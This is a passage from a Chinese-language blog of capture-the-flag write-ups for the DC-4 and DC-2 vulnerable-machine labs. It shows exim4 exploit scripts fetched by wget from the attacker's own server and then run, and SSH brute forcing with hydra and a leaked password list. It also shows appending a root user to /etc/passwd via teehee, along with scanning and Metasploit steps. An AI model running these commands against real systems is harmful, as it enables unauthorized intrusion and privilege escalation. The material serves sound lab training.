&#x2F;usr&#x2F;bin&#x2F;mount</p><p><code>su</code>：su</p><p><code>exim4</code>：</p></blockquote><p>提示无法修改root用户的密码，表明没有root权限，没提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706221743698.png" alt="image-20240706221743698"></p><p>提示只有root用户能够使用 <code>--options</code>，表明当前没有提权成功。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222057830.png" alt="image-20240706222057830"></p><p>提示需要输入密码，后台管理系统的登陆账户密码也不管用。很难通过尝试进行提权。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706222458733.png" alt="image-20240706222458733"></p><p>最后是exim4，它的提权难度较大。</p><p>首先先查看exim4的版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">exim4 --version<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706224633919.png" alt="image-20240706224633919"></p><blockquote><p>exim4：4.89</p></blockquote><p>明确使用exim4进行提权后，使用<code>searchsploit</code>查询可用于提权的代码文件。</p><p>注意！正常来说，命令应该是exim，不是exim4哦！这么输入会报错的。</p><p>exim4：exim指令的version4。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit exim 4<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225050928.png" alt="image-20240706225050928"></p><p>搜索得到的结果不少哦！一般文件后缀为txt文件的比较容易实现。但是这些实现都需要自己手动按照其指示的方法实现。</p><blockquote><p>linux&#x2F;remote&#x2F;25297.txt</p><p>linux&#x2F;remote&#x2F;46974.txt</p><p>multiple&#x2F;dos&#x2F;43184.txt</p><p>linux&#x2F;local&#x2F;39549.txt</p><p>linux&#x2F;dos&#x2F;23896.txt</p></blockquote><p>仔细一看，我们发现其中有<code>.sh</code>后缀的文件，这些文件一般为shell脚本文件。通过运行命令就可以进行利用的，会比手动实现方法相对节省时间。</p><blockquote><p>linux&#x2F;local&#x2F;796.sh</p><p>linux&#x2F;local&#x2F;39535.sh</p><p>linux&#x2F;local&#x2F;46996.sh</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706225933071.png" alt="image-20240706225933071"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">searchsploit -m 796.sh<br>searchsploit -m 39535.sh<br>searchsploit -m 46996.sh<br></code></pre></td></tr></table></figure><p>将这三个.sh文件均下载到当前目录下。</p><p>然后将脚本部署到服务器中，并让目标靶机通过<code>wget</code>命令下载该提权脚本进行执行（以目标靶机合法用户的身份以及交互界面下载）。</p><p>当前kali与目标靶机位于同一网段。所以可以在本机（kali）部署<code>apache2</code>服务让目标靶机下载即可。</p><p>首先在本机（kali）启动apache2服务，然后将下载的shell脚本文件复制到 <code>/var/www/html/</code>文件夹下，相当于放到网页上。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">service apache2 start<br><span class="hljs-built_in">cp</span> 796.sh /var/www/html/<br>service apache2 status  //查看状态<br><br><span class="hljs-built_in">cp</span> 39535.sh /var/www/html/<br><span class="hljs-built_in">cp</span> 46996.sh /var/www/html/<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232255198.png" alt="image-20240706232255198"></p><p>为了防止某一个脚本提权失败，我们把其它的脚本也复制上去。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233427682.png" alt="image-20240706233427682"></p><p>然后到目标靶机（目标靶机用户交互界面处），执行下载操作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget http://192.168.204.128/796.sh<br>wget http://192.168.204.128/39535.sh<br>wget http://192.168.204.128/46996.sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232619485.png" alt="image-20240706232619485"></p><p>由于权限不够，所以下载操作被拒绝了，无法在当前目录进行写入。</p><blockquote><p>一般情况下，<code>tmp</code>目录都具有相当高的权限。</p></blockquote><p>因此，可以尝试切换到<code>/tmp</code>目录下进行提权脚本的下载。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706232913257.png" alt="image-20240706232913257"></p><p>下载成功。把三个都给下载了：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234051092.png" alt="image-20240706234051092"></p><p>然后为下载的脚本加上可执行权限，并执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x 796.sh<br>./796.sh<br><br><span class="hljs-built_in">chmod</span> +x 39535.sh<br>./39535.sh<br><br><span class="hljs-built_in">chmod</span> +x 46996.sh<br>./46996.sh<br></code></pre></td></tr></table></figure><ul><li>.&#x2F;796.sh：发生gcc错误，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706233248963.png" alt="image-20240706233248963"></p><ul><li>39535.sh：没有找到exim命令，提权失败。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234322456.png" alt="image-20240706234322456"></p><ul><li>46996.sh：提权成功。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234350082.png" alt="image-20240706234350082"></p><p>查找flag文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234829075.png" alt="image-20240706234829075"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /root/flag.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706234846253.png" alt="image-20240706234846253"></p><p>至此，所有工作完成。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次是通过burpsuite进行用户名和密码爆破，然后通过shell注入、反弹shell以及命令提权获取最后的flag。</p><p>但是在之前进行Getshell的时候我们还使用到了ssh远程连接。</p><p>所以对于这个靶场，也可以尝试进行ssh爆破（hydra）。</p><blockquote><p>一般在<code>/home</code>目录下能够找到其他用户的文件夹或者更多信息，也能够从各个文件夹中找到更多信息。</p></blockquote><p>在提权成功后，在<code>/home</code>目录下的jim-backups文件夹中，发现了一个名为<code>old-passwords.bak</code>的文件。</p><p>注意！home目录下的三个文件夹看着很像用户的文件夹。所以在后续进行爆破的时候，用户名字典就从这三个文件夹名入手。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240706235128164.png" alt="image-20240706235128164"></p><blockquote><p>.bak后缀的文件通常是备份文件。用于存储数据的副本，以防止原始文件意外丢失或损坏。</p></blockquote><p>查看其具体内容,可以猜测是一个密码字典。对其进行复制保存，也许以后爆破的时候会用上。</p><blockquote><p>000000<br>12345<br>iloveyou<br>1q2w3e4r5t<br>1234<br>123456a<br>qwertyuiop<br>monkey<br>123321<br>dragon<br>654321<br>666666<br>123<br>myspace1<br>a123456<br>121212<br>1qaz2wsx<br>123qwe<br>123abc<br>tinkle<br>target123<br>gwerty<br>1g2w3e4r<br>gwerty123<br>zag12wsx<br>7777777<br>qwerty1<br>1q2w3e4r<br>987654321<br>222222<br>qwe123<br>qwerty123<br>zxcvbnm<br>555555<br>112233<br>fuckyou<br>asdfghjkl<br>12345a<br>123123123<br>1q2w3e<br>qazwsx<br>loveme1<br>juventus<br>jennifer1<br>!~!1<br>bubbles<br>samuel<br>fuckoff<br>lovers<br>cheese1<br>0123456<br>123asd<br>999999999<br>madison<br>elizabeth1<br>music<br>buster1<br>lauren<br>david1<br>tigger1<br>123qweasd<br>taylor1<br>carlos<br>tinkerbell<br>samantha1<br>Sojdlg123aljg<br>joshua1<br>poop<br>stella<br>myspace123<br>asdasd5<br>freedom1<br>whatever1<br>xxxxxx<br>00000<br>valentina<br>a1b2c3<br>741852963<br>austin<br>monica<br>qaz123<br>lovely1<br>music1<br>harley1<br>family1<br>spongebob1<br>steven<br>nirvana<br>1234abcd<br>hellokitty<br>thomas1<br>cooper<br>520520<br>muffin<br>christian1<br>love13<br>fucku2<br>arsenal1<br>lucky7<br>diablo<br>apples<br>george1<br>babyboy1<br>crystal<br>1122334455<br>player1<br>aa123456<br>vfhbyf<br>forever1<br>Password<br>winston<br>chivas1<br>sexy<br>hockey1<br>1a2b3c4d<br>pussy<br>playboy1<br>stalker<br>cherry<br>tweety<br>toyota<br>creative<br>gemini<br>pretty1<br>maverick<br>brittany1<br>nathan1<br>letmein1<br>cameron1<br>secret1<br>google1<br>heaven<br>martina<br>murphy<br>spongebob<br>uQA9Ebw445<br>fernando<br>pretty<br>startfinding<br>softball<br>dolphin1<br>fuckme<br>test123<br>qwerty1234<br>kobe24<br>alejandro<br>adrian<br>september<br>aaaaaa1<br>bubba1<br>isabella<br>abc123456<br>password3<br>jason1<br>abcdefg123<br>loveyou1<br>shannon<br>100200<br>manuel<br>leonardo<br>molly1<br>flowers<br>123456z<br>007007<br>password.<br>321321<br>miguel<br>samsung1<br>sergey<br>sweet1<br>abc1234<br>windows<br>qwert123<br>vfrcbv<br>poohbear<br>d123456<br>school1<br>badboy<br>951753<br>123456c<br>111<br>steven1<br>snoopy1<br>garfield<br>YAgjecc826<br>compaq<br>candy1<br>sarah1<br>qwerty123456<br>123456l<br>eminem1<br>141414<br>789789<br>maria<br>steelers<br>iloveme1<br>morgan1<br>winner<br>boomer<br>lolita<br>nastya<br>alexis1<br>carmen<br>angelo<br>nicholas1<br>portugal<br>precious<br>jackass1<br>jonathan1<br>yfnfif<br>bitch<br>tiffany<br>rabbit<br>rainbow1<br>angel123<br>popcorn<br>barbara<br>brandy<br>starwars1<br>barney<br>natalia<br>jibril04<br>hiphop<br>tiffany1<br>shorty<br>poohbear1<br>simone<br>albert<br>marlboro<br>hardcore<br>cowboys<br>sydney<br>alex<br>scorpio<br>1234512345<br>q12345<br>qq123456<br>onelove<br>bond007<br>abcdefg1<br>eagles<br>crystal1<br>azertyuiop<br>winter<br>sexy12<br>angelina<br>james<br>svetlana<br>fatima<br>123456k<br>icecream<br>popcorn1</p></blockquote><p>kali默认密码字典：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p>pay：如果之前没有进入到目标目录对默认字典文件进行解压的话，是会报错的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gunzip rockyou.txt.gz<br></code></pre></td></tr></table></figure><h3 id="hydra爆破"><a href="#hydra爆破" class="headerlink" title="hydra爆破"></a>hydra爆破</h3><p>使用默认密码字典进行爆破的话所需的时间 太长了，而且也有爆破失败的风险</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L usersname.txt -P passworddicDC4.txt ssh://192.168.204.133<br></code></pre></td></tr></table></figure><p>其中：</p><p><code>passworddicDC4.txt</code>是上述从jim文件夹中获取到的密码备份文件。</p><p><code>usersname.txt</code>中包含在目标靶机home目录下的疑似用户文件夹的三个用户名。</p><p>ok！很快就爆破出了一个合法的SSH账户：</p><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131345123.png" alt="image-20240715131345123"></p><h3 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h3><blockquote><p>host: 192.168.204.133 </p><p>login: jim </p><p>password: jibril04</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh jim@192.168.204.133<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131622681.png" alt="image-20240715131622681"></p><p>ok！成功远程登陆了jim账户。</p><h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715131837232.png" alt="image-20240715131837232"></p><p>由上述执行结果可知，需要输入jim用户的sudo账户密码，但是我们不知道。</p><p>接着我们查看jim用户所在系统中具有SUID权限的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132113057.png" alt="image-20240715132113057"></p><p>这其中，可以尝试的提权指令有：exim4、mount、su、passwd。但是经过上述的经验，最终能成功进行提权的命令只有exim4，但是它的提权过程比较复杂。</p><p>所以我们可以尝试获取其它信息并择出其中有用的信息进行提权。</p><p>使用<code>ls</code>指令查看当前用户的目录列表：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132521386.png" alt="image-20240715132521386"></p><p>发现了一个shell脚本<code>test.sh</code>，但是光看名字感觉就好像不太能提权的样子。还有一个提示信息，提示在存储邮件文件的文件夹<code>/var/mail/jim</code>下有新的邮件，尝试进入查看并寻找有用信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/mail/jim<br></code></pre></td></tr></table></figure><p>提示错误：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132833915.png" alt="image-20240715132833915"></p><p>再次尝试进入其上一级目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/mail<br><span class="hljs-built_in">ls</span><br><span class="hljs-built_in">cat</span> jim<br></code></pre></td></tr></table></figure><p>成功：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715132958425.png" alt="image-20240715132958425"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133158149.png" alt="image-20240715133158149"></p><p>读取邮件信息可以得到jim的同事，Charles的账户信息：</p><blockquote><p>user：Charles</p><p>password：^xHhA&amp;hvim0y</p></blockquote><p>尝试远程登陆Charles的账户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh Charles@192.168.204.133<br></code></pre></td></tr></table></figure><p>因为已经远程登陆了jim账户，所再尝试同时登陆Charles的账户时就会被拒绝请求，因此我们需要在jim终端进行账户切换。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Charles<br>su charles<br></code></pre></td></tr></table></figure><p>惹，报错惹：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133710662.png" alt="image-20240715133710662"></p><p>回去查看了一下邮件，发现其对jim的称呼为<code>Jim</code>，猜测实际用户名应该是小写开头。</p><p>ok！成功切换：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715133858991.png" alt="image-20240715133858991"></p><p>查看charles用户中具有SUID权限的命令都有哪些：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134104570.png" alt="image-20240715134104570"></p><p>查询结果和jim的一样，再使用<code>sudo -l</code>显示出当前登陆用户的权限：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715134313545.png" alt="image-20240715134313545"></p><p>根据提示信息可以知道，<code>/usr/bin/teehee</code>具有root权限，可以尝试提权。</p><blockquote><p>teehee是一个小众的linux编辑器，若其拥有root权限，则可用于提权。提权的核心思路是：利用其在passwd文件中追加一条uid为0的用户条目。</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Name::0:0:::/bin/bash&quot;</span> | sudo teehee -a /etc/passwd<br></code></pre></td></tr></table></figure><p>这里的<code>Name</code>可以是任意名字。执行该条指令之后，再执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">su Name<br></code></pre></td></tr></table></figure><p>即可成功提权！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135103294.png" alt="image-20240715135103294"></p><p>四处查看文件：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135346117.png" alt="image-20240715135346117"></p><p>退回上一级目录，进行文件匹配查找：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135445574.png" alt="image-20240715135445574"></p><p>ok！成功找到！</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240715135511759.png" alt="image-20240715135511759"></p><p>提权完毕！</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>使用hydra爆破SSH账户进行提权，其过程要比burpsuite爆破并进行exim4提权的过程要简单和快速。</p><ol><li>信息检索能力很重要，拿到主机shell的时候多去翻翻目录<code>var</code>、<code>home</code>等等目录，找找信息。</li><li>exim4、teehee可以用于提权，多找命令。</li><li>如何使用命令执行反弹shell。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DC-2</title>
    <link href="/2024/07/24/DC-2/"/>
    <url>/2024/07/24/DC-2/</url>
    
    <content type="html"><![CDATA[<h1 id="DC-2"><a href="#DC-2" class="headerlink" title="DC-2"></a>DC-2</h1><h2 id="IP扫描"><a href="#IP扫描" class="headerlink" title="IP扫描"></a>IP扫描</h2><p>查看kali主机IP：（ifconfig）</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827301193.png"></p><p>将目标靶机的“网络适配器”模式改为“NAT”模式，保证其使用与kali相同的模式，即使得二者处于同一个网段内。</p><p>使用nmap扫描确认靶机的IP地址（最好在root权限下进行操作，以防出现权限不足的情况）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sN 192.168.204.0/24<br></code></pre></td></tr></table></figure><p>未打开靶机前进行kali网段IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827357707.png" alt="img"></p><p>打开靶机后进行kali网络IP扫描：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827411142.png" alt="img"></p><p>通过对比可以得到，靶机的IP地址为：<code>192.168.204.131</code></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ul><li><p>普通开放端口扫描</p><p><code>-sV</code> ：对端口上的服务程序进行扫描，扫描提供服务的版本。</p><p><code>-sT</code>：TCP连接扫描，不安全，速度较慢，但相对准确。</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sV -p- 192.168.204.131<br>nmap -sT -p- 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827522630.png" alt="img"></p><p>可以看到，开放的端口有<code>80</code>和<code>7744</code>。</p><ul><li><p>开放端口详细扫描</p><p><code>-sT</code> ：TCP连接扫描，不安全，速度较慢，但相对准确</p><p><code>-sV</code> ： 对端口上的服务程序进行扫描，扫描提供服务的版本</p><p><code>-sC</code> ：表示使用默认的脚本进行扫描</p><p><code>-O</code> ：扫描操作系统的版本</p><p><code>-p </code>： 指定扫描端口</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -sT -sV -sC -O -p 80,7744 192.168.204.131<br></code></pre></td></tr></table></figure><p>扫描结果如下：<br><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827560872.png" alt="img"></p><p>由扫描结果，似乎没有什么有用的信息，比如目标靶机是使用什么框架的网站之类的。</p><h2 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h2><p>端口扫描得到的有效信息太少，所以尝试使用gobuster目录爆破去获取更多有用的信息。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gobuster <span class="hljs-built_in">dir</span> -u http://192.168.204.131 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p>爆破结果如下:</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827634237.png" alt="img"></p><p>获得三个目标靶机目录下的网页链接:</p><blockquote><p> <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a></p><p> <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a></p><p> <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a></p></blockquote><p>对这三个网页逐个进行访问:</p><p>① <a href="http://192.168.204.131/wp-content/">http://192.168.204.131/wp-content/</a> 没有内容加载出来</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827670668.png" alt="img"></p><p>② <a href="http://192.168.204.131/wp-includes/">http://192.168.204.131/wp-includes/</a> 有很多php脚本文件</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827720354.png"></p><p>③ <a href="http://192.168.204.131/wp-admin/">http://192.168.204.131/wp-admin/</a> 无法访问</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827759682.png" alt="img"></p><p>而且可以发现,输入网址<code>http://192.168.204.131/wp-admin/</code>,浏览器总会将其重定向至<code>dc-2</code>导致发生错误。</p><h2 id="重定向修改访问"><a href="#重定向修改访问" class="headerlink" title="重定向修改访问"></a>重定向修改访问</h2><p>访问目标靶机的IP地址，<code>192.168.204.131</code>，查看网页的返回界面。如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721827793444.png" alt="img"></p><p>经过多次尝试之后可以得知，每次访问目标靶机IP地址时，其响应网页都会被重定向到域名<code>dc-2</code>。由此判断，该IP地址网页被做了重定向处理。</p><p>回顾之前的nmap详细扫描，已经展现出一些网页重定向的端倪了：</p><p>（由于第一次实验图片丢失，第二遍补做实验的时候nmap详细扫描出来的结果稍有变化，但第一次实验其http-title确实有如下提示）</p><blockquote><p>http-title: Did not follow redirect to <a href="http://dc-2/">http://dc-2/</a></p><p>​  未遵循重定向到<a href="http://dc-2/">http://dc-2/</a></p></blockquote><p>解决重定向处理问题，找到原靶机主页的方法（之一）：</p><blockquote><p>对本地（kali）的host文件进行修改。</p><p>打开 <code>etc/hosts</code>文件，添加本地DNS记录 <code>192.168.204.131 dc-2</code></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/hosts<br></code></pre></td></tr></table></figure><p>然后在上方的<code>IP-域名</code>处添加靶机IP与“dc-2”的关联记录。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828170873.png" alt="img"></p><p>然后在浏览器中重新访问靶机IP地址，得到的效果如下：</p><blockquote><p>注意! 这里的DNS记录添加到的是kali内部的<code>hosts</code>文件，所以重定向修改生效的效果也只会在kali虚拟机内部展现出来。</p><p>如果想要在自己的物理主机上也能实现重定向修改的话，需要修改<code>本物理主机的hosts</code>文件。以管理员权限访问 <code>C:\Windows\System32\drivers\etc</code>下的hosts文件，添加靶机IP与“dc-2”的关联记录。</p></blockquote><p>在kali浏览器中访问网址<code>192.168.204.131</code>，得到的效果如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828285726.png" alt="img"></p><p>可以看到，已经不是之前的重定向无响应界面了，网址的返回网页是正常网页类型。</p><h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><p>环视网页内容，可以发现右下角有一个<code>flag1</code>字样的选择栏，点进去：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721828251738.png" alt="img"></p><p>flag1有一个提示信息：</p><blockquote><p>Flag 1:</p><p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p><p>你通常的单词表（字典）可能不起作用，因此，也许你只需要（成为）cewl</p></blockquote><p>cewl是什么？经过网络查询。</p><table><thead><tr><th align="left">cewl，自定义词表生成器，是一个ruby程序，是kali linux下的一个工具。可以将特定URL爬取到定义的深度并返回关键字列表（字典）。密码破解者如John the Ripper、Medusa和 WFuzz 可以使用这些关键字来破解密码。Cewl 还有一个相关的命令行应用程序 FAB，它使用相同的元数据提取技术，使用 CeWL 等信息提取算法从已下载的文件中生成作者&#x2F;制作者列表。</th></tr></thead></table><p>Kali Linux字典生成工具Cewl使用全指南：</p><p><a href="https://www.freebuf.com/articles/network/190128.html">https://www.freebuf.com/articles/network/190128.html</a></p><p>你以为接下来就是要开始使用cewl啦？别急，我们先干接下来这事。</p><p>回顾靶场dc-1，我们通过识别nmap漏扫获取了网页的使用框架，然后通过metasploit查找该框架的漏洞。利用漏洞实现了用户登陆以及用户提权。</p><p>所以在dc-2这个靶场中，我们也尝试通过获取目标网页所使用框架等技术构成信息。但是前面的端口扫描也没有扫出什么有用的信息，所以我们尝试使用whatweb指纹工具来进行识别。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629104913096.png" alt="image-20240629104913096"></p><p>或者利用浏览器插件wappalyer进行指纹识别：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629105413201.png" alt="image-20240629105413201"></p><p>得到的部分信息如下：</p><blockquote><p> WordPress 4.7.10</p><p> Apache 2.4.10</p><p> JQuery 1.12.4</p><p> JQuery MIgrate 1.4.1</p><p> Databases MySQL</p></blockquote><p>其中<code>WordPress</code>是一个广泛使用的开源CMS，基于PHP语言开发。ok，我们又获取了网页的框架信息，尝试查找这个框架的相关漏洞，并尝试利用漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br><br>search WordPress<br></code></pre></td></tr></table></figure><p>可以找到有117个漏洞（很多，就不一一截图记录了）：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629111815721.png" alt="image-20240629111815721"></p><p>可以尝试使用最新的一个漏洞进行利用尝试。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629160813860.png" alt="image-20240629160813860"></p><p>利用这个23年11月的最新高等级的漏洞：</p><p> <code>exploit/multi/http/wp_royal_elementor_addons_rce</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/http/wp_royal_elementor_addons_rce<br><br>show options<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240629161500801.png" 